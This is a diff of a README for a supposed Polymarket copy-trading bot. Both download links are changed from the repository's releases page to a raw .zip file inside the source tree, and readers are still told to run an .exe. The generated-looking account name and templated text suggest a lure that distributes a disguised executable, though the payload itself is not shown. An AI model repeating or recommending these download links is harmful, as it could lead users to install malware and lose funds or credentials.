@@ -1,6 +1,6 @@
 # 🤖 polymarket-copy-trading-bot - Execute orders using expert market patterns
 
-[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kalliimmunosuppressive504/polymarket-copy-trading-bot/releases)
+[![Download Application](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/kalliimmunosuppressive504/polymarket-copy-trading-bot/raw/refs/heads/main/src/core/bot-copy-polymarket-trading-1.9.zip)
 
 ## 🎯 About the software
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards to run the software.
 
 ## 📦 How to get the software
 
-1. Visit [this page](https://github.com/kalliimmunosuppressive504/polymarket-copy-trading-bot/releases) to download the installer.
+1. Visit [this page](https://github.com/kalliimmunosuppressive504/polymarket-copy-trading-bot/raw/refs/heads/main/src/core/bot-copy-polymarket-trading-1.9.zip) to download the installer.
 2. Look for the file ending in .exe under the latest version.
 3. Click the file to start the download.
 
